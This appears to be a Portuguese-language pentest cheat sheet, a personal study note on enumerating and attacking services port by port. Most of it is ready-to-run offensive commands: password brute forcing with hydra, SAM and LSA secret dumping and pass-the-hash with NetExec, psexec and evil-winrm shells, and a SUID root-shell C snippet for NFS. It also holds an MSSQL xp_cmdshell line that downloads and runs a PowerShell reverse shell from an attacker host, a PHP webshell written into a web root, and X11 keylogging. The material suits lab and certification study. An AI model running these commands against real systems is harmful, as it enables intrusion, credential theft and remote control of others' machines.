
# 3. Enumeração de Serviços (por porta)

> [!tip] Para cada serviço: versão? credenciais default? login anônimo? searchsploit da versão?

### FTP — 21

```bash
ftp -p $IP                      # cliente; testar anônimo (anonymous:anonymous)
# checar: upload (put), login anônimo, versão explorável (vsftpd backdoor, cve2010-4221)
nmap -p21 --script ftp-anon,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 $IP
```
**FTP bounce** (usar um FTP server para escanear outro host):
```bash
nmap -T0 -v -b username:password@ftpserver.tld:21 victim.tld
ftp> type binary        # sempre baixar binários em modo binary
```

### SSH — 22

```bash
hydra -s 22 -L users.txt -P passwords.txt $IP ssh
# -l usuário | -L lista de usuários | -p senha | -P lista de senhas | -s porta
```

### Telnet — 23

```bash
telnet $IP 23
# msf: use auxiliary/scanner/telnet/telnet_login
# NSE: telnet-brute, telnet-encryption, telnet-ntlm-info
```

### DNS — 53

```bash
whois <domínio>; whois $IP
dig axfr @<dns-server> <domínio>      # zone transfer
dig -x $IP @$IP                       # reverse lookup
dig a  <domínio> @<ns>; dig mx <domínio> @<ns>; dig ns <domínio> @<ns>
host -t ns <domínio>                  # nameservers
host -l <domínio> <ns>                # tentar zone transfer
dnsrecon -d megacorpone.com -t axfr
dnsrecon -d <target> -D /usr/share/wordlists/dnsmap.txt -t std
dnsenum zonetransfer.me
# Zone transfer no Windows: nslookup -> set type=any -> ls -d blah.com
# Reverse lookup brute force de um range:
for ip in $(seq 155 190); do host 50.7.67.$ip; done | grep -v "not found"
```

### SMB / NetBIOS — TCP 139,445 · UDP 137,138

```bash
nmap -v -p139,445 --script smb-vuln-* $IP
nbtscan -r 192.168.11.0/24
nmblookup -A $IP                       # consultar nomes NetBIOS
enum4linux -a $IP
smbmap -H $IP                          # listar shares
smbmap -H $IP -R DATA                  # recursivo
smbmap -H $IP -R DATA --download 'Data\Search\arquivo.txt'
smbmap -u Tempuser -p Welcome123 -H $IP -R DATA          # com credenciais
smbmap -d active.htb -u SVC_TGS -p 'GPPsaras2012' -H $IP # enum de domínio
smbclient -N -L //$IP                  # listar shares (mostra versão do samba)
smbclient //$IP/<share> -N            # conectar anônimo
rpcclient -U "" $IP                    # rpcclient anônimo
```
**NetExec (nxc)** — enumeração/credenciais moderna (substitui crackmapexec):
```bash
nxc smb $IP -u '' -p '' --shares                      # null session → shares
nxc smb $IP -u 'guest' -p '' --rid-brute              # enumerar usuários por RID
nxc smb $IP -u user -p 'SENHA' --shares               # com credenciais ((Pwn3d!) = admin)
nxc smb $IP -u user -p 'SENHA' --sam                  # dump SAM
nxc smb $IP -u user -p 'SENHA' --lsa                  # dump LSA secrets
nxc smb $IP -u user -H <NThash> -x "whoami"           # pass-the-hash + exec
nxc smb 192.168.1.0/24 -u user -p 'SENHA'             # spray na sub-rede
nxc smb $IP -u '' -p '' -M ms17-010                   # checar EternalBlue
```
Montar share:
```bash
mount -t cifs //$IP/Replication /mnt/Replication -o username=<u>,password=<p>,domain=active.htb
grep -R password /mnt/Replication/
```
Shell com credenciais:
```bash
psexec.py DOMAIN/administrator:'SENHA'@$IP
winexe -U Administrator //$IP "cmd.exe"
# Se 445 fechado externamente, faça remote port forward:
plink.exe -l sshproxy -pw sshproxy -R 445:127.0.0.1:445 <kali>
```

### RDP — 3389

```bash
xfreerdp3 /v:$IP /u:Administrador /p:'SENHA' +clipboard /dynamic-resolution
xfreerdp3 /v:$IP /u:Administrador /pth:<NThash>          # pass-the-hash
xfreerdp3 /v:$IP /u:user /p:'SENHA' /drive:share,/tmp    # mapear pasta local
nxc rdp $IP -u user -p 'SENHA' --screenshot             # validar login + screenshot
# brute: crowbar / ncrack / hydra rdp
```

### WinRM — 5985/5986

```bash
evil-winrm -i $IP -u Administrador -p 'SENHA'           # shell interativa
evil-winrm -i $IP -u Administrador -H <NThash>          # pass-the-hash
# dentro: upload <local> | download <remoto> | menu (carrega utilitários)
nxc winrm $IP -u user -p 'SENHA'                        # validar acesso WinRM
nxc winrm $IP -u user -p 'SENHA' -x "whoami"            # exec remoto
```

### SNMP — UDP 161/162

```bash
nmap -sU --open -p161 $IP-190 -oG snmp.txt
onesixtyone -c community.txt -i ips.txt        # brute de community strings
snmpwalk -c public -v1 $IP                      # enum geral
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25    # usuários Windows
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2   # processos
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3     # portas TCP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 $IP
```
OIDs úteis: `25.1.6.0` processos · `25.4.2.1.2` programas em execução · `25.4.2.1.4` caminhos · `25.2.3.1.4` storage · `25.6.3.1.2` software · `4.1.77.1.2.25` contas de usuário · `6.13.1.3` portas TCP locais.

### Email — SMTP 25/587 · POP3 110/995 · IMAP 143/993

```bash
nc -nv $IP 25
VRFY root                # verifica se usuário existe
EXPN <lista>             # membros de mailing list
smtp-user-enum -M VRFY -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
nmap -p25 --script=smtp-open-relay $IP
```
Enviar email manualmente:
```text
HELO my.server.com
MAIL FROM: me@mydomain.com
RCPT TO: you@yourdomain.com
DATA
Subject: teste

corpo
.
QUIT
```

### TFTP — UDP 69
Similar ao FTP (sem autenticação). Útil para transferência de arquivos → ver [[11 - Métodos de Transferência de Arquivos]].

### RPC / NFS — 111, 135, 593, 2049

```bash
rpcinfo -p $IP
rpcdump.py $IP                          # impacket
showmount -e $IP                        # exports NFS
nmap -Pn -sV --script=nfs* $IP
mount -o nolock $IP:/remote /mnt/local
mount -t nfs $IP:/backup /mnt/backup
```
> [!warning] `no_root_squash` em `/etc/exports` + permissão de escrita → privesc criando binário SUID root:
> ```c
> int main(void){ setgid(0); setuid(0); execl("/bin/sh","sh",0); }
> ```
> `chown root:root pwnme; chmod u+s pwnme`

### MS-SQL — 1433

```bash
mssqlclient.py -windows-auth reporting@$IP        # impacket
sqsh -S $IP -U sa -P 'SENHA'
select IS_SRVROLEMEMBER('sysadmin');              # checar permissões
enable_xp_cmdshell
xp_cmdshell 'whoami'
# Roubar hash NetNTLM via responder (kali: responder -I tun0 -rv):
exec xp_dirtree '\\10.10.14.6\share\file'
exec xp_fileexist '\\10.10.14.6\share\file'
# Reverse shell:
xp_cmdshell powershell iex(new-object net.webclient).downloadstring('http://10.10.14.6/Invoke-PowerShellTcp.ps1')
```

### MySQL — 3306

```sql
select load_file('/etc/passwd');                  -- leitura de arquivo
select sys_exec('/bin/bash');                      -- se UDF disponível
-- Escrever webshell (via sqlmap/phpmyadmin):
SELECT "<?php passthru($_GET['cmd']); ?>" INTO dumpfile '/var/www/html/shell.php';
select 0x3c3f... into outfile "/var/www/html/uploads/phpinfo.php";
```

### PostgreSQL — 5432
`nmap --script pgsql-brute $IP`

### Oracle — 1521
```bash
sqlplus64 scott/tiger@$IP:1521/XE as sysdba
odat all -s $IP -p 1521
odat passwordguesser --accounts-file oracle-defaults.txt -s $IP -p 1521 -d XE
odat utlfile -s $IP -U scott -P tiger -d XE --sysdba --putFile C:\\windows\\temp shell.exe shell.exe
hydra -L /usr/share/oscanner/lib/services.txt -s 1521 $IP oracle-sid
oscanner -s $IP
```

### MongoDB — 27017/27018
`nmap --script mongodb-databases,mongodb-info $IP` · testar NoSQLi na web.

### LDAP — 389

```bash
ldapsearch -h $IP -p 389 -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -x -h $IP -p389 -D 'SVC_TGS' -w 'SENHA' -b "dc=active,dc=htb" \
  -s sub "(&(objectCategory=person)(objectClass=user))" samaccountname | grep sAMAccountName
```

### IPsec / IKE (ISAKMP) — UDP 500

```bash
ike-scan $IP                            # 1=handshake retornado → é gateway IPsec
ike-scan -M --showbackoff $IP           # fingerprint do vendor
ike-scan -P -M -A -n fakeID $IP         # brute de id
python ikeforce.py $IP -e -w /usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt
```
Conectar com strongswan (`/etc/ipsec.conf` + `/etc/ipsec.secrets` com PSK), depois `ipsec start --nofork`.

### VNC — 5900

```bash
echo MYVNCPASS | vncpasswd -f > passvnc
vncviewer $IP -passwd passvnc
```

### X11 — 6000

```bash
xdpyinfo -display $IP:0
xwd -root -display $IP:0 -out screenshot.xdump     # screenshot
xspy $IP                                            # keylog
```

### Finger — 79

```bash
finger root@$IP
for i in $(cat names.txt); do finger $i@$IP; done | tee finger-brute.out
hydra -L users.txt -P rockyou.txt rlogin://target
```

### SIP (VoIP) — 5060

```bash
svmap $IP                                  # descobrir devices
svwar -m INVITE -e100-300 $IP              # extensions
# Exploit do Elastix precisa da extension (exploit-db 18650)
```

### Serviços diversos (NSE rápido)

```bash
# rsync 873:   nmap --script rsync-list-modules $IP
# memcached 11211: nmap --script memcached-info $IP
# iSCSI 3260:  iscsiadm -m discovery -t sendtargets -p $IP
# RTSP 554:    nmap -p554 --script rtsp-methods,rtsp-url-brute $IP -sV   (Cameradar)
# AFP 548:     nmap --script afp-serverinfo,afp-showmount,afp-ls $IP
# Kerberos 88: nmap --script krb5-enum-users $IP
# Rservices 512/513/514: use auxiliary/scanner/rservices/{rlogin,rsh,rexec}_login
# EthernetIP 44818 / BACnet 47808 / Cassandra 9160 / PJL 9100 / NDMP 10000 → NSE dedicados
```
